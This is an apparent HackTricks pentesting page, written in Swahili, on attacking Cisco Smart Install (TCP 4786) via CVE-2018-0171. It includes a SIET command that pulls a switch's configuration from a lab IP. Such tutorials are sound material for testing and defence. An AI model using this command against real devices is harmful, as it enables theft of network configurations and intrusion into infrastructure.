# 4786 - Cisco Smart Install

{{#include ../banners/hacktricks-training.md}}


## Basic Information

**Cisco Smart Install** ni teknolojia ya Cisco iliyoundwa kuboresha usanidi wa awali na upakiaji wa picha ya mfumo wa uendeshaji kwa vifaa vipya vya Cisco. **Kwa default, Cisco Smart Install inafanya kazi kwenye vifaa vya Cisco na inatumia protokali ya safu ya usafirishaji, TCP, na nambari ya bandari 4786.**

**Nambari ya bandari ya default:** 4786
```
PORT      STATE  SERVICE
4786/tcp  open   smart-install
```
## **Smart Install Exploitation Tool**

**Mnamo mwaka wa 2018, udhaifu muhimu, CVE-2018–0171, ulipatikana katika protokali hii. Kiwango cha tishio ni 9.8 kwenye kiwango cha CVSS.**

**Pakiti iliyoundwa kwa njia maalum iliyotumwa kwenye bandari ya TCP/4786, ambapo Cisco Smart Install iko hai, inasababisha overflow ya buffer, ikimruhusu mshambuliaji:**

- kulazimisha kuanzisha upya kifaa
- kuita RCE
- kuiba mipangilio ya vifaa vya mtandao.

**The** [**SIET**](https://github.com/frostbits-security/SIET) **(Smart Install Exploitation Tool)** ilitengenezwa ili kutumia udhaifu huu, inakuwezesha kutumia Cisco Smart Install. Katika makala hii nitakuonyesha jinsi unavyoweza kusoma faili halali ya mipangilio ya vifaa vya mtandao. Kuunda exfiltration kunaweza kuwa na thamani kwa pentester kwa sababu itajifunza kuhusu sifa za kipekee za mtandao. Na hii itarahisisha maisha na kuruhusu kupata njia mpya za shambulio.

**Kifaa cha lengo kitakuwa swichi ya “live” ya Cisco Catalyst 2960. Picha za virtual hazina Cisco Smart Install, hivyo unaweza tu kufanya mazoezi kwenye vifaa halisi.**

Anwani ya swichi ya lengo ni **10.10.100.10 na CSI iko hai.** Pakia SIET na anza shambulio. **The -g argument** inamaanisha exfiltration ya mipangilio kutoka kwa kifaa, **the -i argument** inakuwezesha kuweka anwani ya IP ya lengo lenye udhaifu.
```
~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.10.100.10
```
<figure><img src="../images/image (773).png" alt=""><figcaption></figcaption></figure>

Usanidi wa swichi **10.10.100.10** utakuwa katika folda **tftp/**

<figure><img src="../images/image (1116).png" alt=""><figcaption></figcaption></figure>


{{#include ../banners/hacktricks-training.md}}
